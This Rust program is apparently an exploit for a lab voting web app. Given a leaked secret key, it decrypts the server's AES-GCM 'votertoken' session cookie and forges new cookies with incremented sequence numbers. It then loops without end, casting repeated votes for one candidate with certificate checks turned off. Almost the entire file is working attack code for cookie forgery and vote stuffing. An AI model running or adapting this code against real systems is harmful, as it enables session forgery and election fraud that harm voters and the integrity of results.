use reqwest;
use reqwest_cookie_store;
use aes_gcm::aead::{generic_array::GenericArray, Aead, AeadInPlace, KeyInit, Payload};
use aes_gcm::Aes256Gcm;
use ::cookie::{Key, Cookie};
use urlencoding::decode;
use rand::RngCore;
use std::time::Duration;
use url::Url;
use std::thread;

pub const NONCE_LEN: usize = 12;
pub const TAG_LEN: usize = 16;
pub const KEY_LEN: usize = 32;

#[tokio::main]
async fn main() {
    let args: Vec<String> = std::env::args().collect();
    let secret = &args[1];
    //initialize mutable cookie storage
    let jar = reqwest_cookie_store::CookieStore::default();
    let jar = reqwest_cookie_store::CookieStoreMutex::new(jar);
    let jar = std::sync::Arc::new(jar);
    let mut sequence_num: u32=1;
    //initialize client with said storage
    let client = reqwest::Client::builder().cookie_provider(std::sync::Arc::clone(&jar)).danger_accept_invalid_certs(true).build().unwrap();
    //log in to server legitimatley
    client.post("https://api.internal:443/login").form(&[("ssn", "12345"),("password","1234")]).send().await.unwrap();
    {
        let store = jar.lock().unwrap();
        for c in store.iter_unexpired() {
        println!("Got cookie {},{}\n", &c.name(),&c.value());
        sequence_num = unseal(c.name(),c.value(),&secret).unwrap().parse::<u32>().unwrap();
        println!("Decrypted value: Name={}, value={}",&c.name(),&sequence_num);
        }
    }
    //vote legitly to grab cookie
    client.post("https://api.internal:443/vote").form(&[("candidate","candidate3")]).send().await.unwrap();
    sequence_num += 1;
    println!("Entering endless loop, press ctrl+C to exit.");
    loop{
        thread::sleep(Duration::from_millis(100));
        // send a new vote with our forged cookie
        let fakevote = client.post("https://api.internal:443/vote").form(&[("candidate","candidate3")]).send().await.unwrap();
        {
            let mut store = jar.lock().unwrap();
            // check if vote worked
            if fakevote.text().await.unwrap().contains("Thanks for voting"){
                println!("Voted for gus with sequence number {}",&sequence_num);
                store.clear();
                sequence_num += 1;}
                let newcookie = Cookie::new("votertoken",encrypt_cookie("votertoken", &sequence_num.to_string(),&secret));
                // webserver will have removed our cookie regardless of auth success so we need to put it back
                store.insert_raw(&newcookie, &Url::parse("https://api.internal").unwrap()).unwrap();
        }
    }
}


// taken from the cookie secure crate
fn unseal(name: &str, value: &str, secret: &String) -> Result<String, &'static str> {
    let key = Key::derive_from(base64::decode(secret.as_str()).unwrap().as_slice());

    // cookie is in URL format which will make base64 throw a fit, decode cookie content
    let cstring = decode(value).expect("utf8").into_owned();
    let data = base64::decode(cstring).map_err(|_| "bad base64 value")?;
    if data.len() <= NONCE_LEN {
        return Err("length of decoded data is <= NONCE_LEN");
    }

    let (nonce, cipher) = data.split_at(NONCE_LEN);
    let payload = Payload { msg: cipher, aad: name.as_bytes() };

    let aead = Aes256Gcm::new(GenericArray::from_slice(key.encryption().try_into().unwrap()));
    aead.decrypt(GenericArray::from_slice(nonce), payload)
        .map_err(|_| "invalid key/nonce/value: bad seal")
        .and_then(|s| String::from_utf8(s).map_err(|_| "bad unsealed utf8"))
}

fn encrypt_cookie(name: &str, value: &str, secret: &String) -> String {
    // Create a vec to hold the [nonce | cookie value | tag].
    let key = Key::derive_from(base64::decode(secret.as_str()).unwrap().as_slice());
    let cookie_val = value.as_bytes();
    let mut data = vec![0; NONCE_LEN + cookie_val.len() + TAG_LEN];

    // Split data into three: nonce, input/output, tag. Copy input.
    let (nonce, in_out) = data.split_at_mut(NONCE_LEN);
    let (in_out, tag) = in_out.split_at_mut(cookie_val.len());
    in_out.copy_from_slice(cookie_val);

    // Fill nonce piece with random data.
    let mut rng = rand::thread_rng();
    rng.try_fill_bytes(nonce).expect("couldn't random fill nonce");
    let nonce = GenericArray::clone_from_slice(nonce);

    // Perform the actual sealing operation, using the cookie's name as
    // associated data to prevent value swapping.
    let aad = name.as_bytes();
    let aead = Aes256Gcm::new(GenericArray::from_slice(key.encryption()));
    let aad_tag = aead.encrypt_in_place_detached(&nonce, aad, in_out)
        .expect("encryption failure!");

    // Copy the tag into the tag piece.
    tag.copy_from_slice(&aad_tag);

    // Base64 encode [nonce | encrypted value | tag].
    base64::encode(&data)
}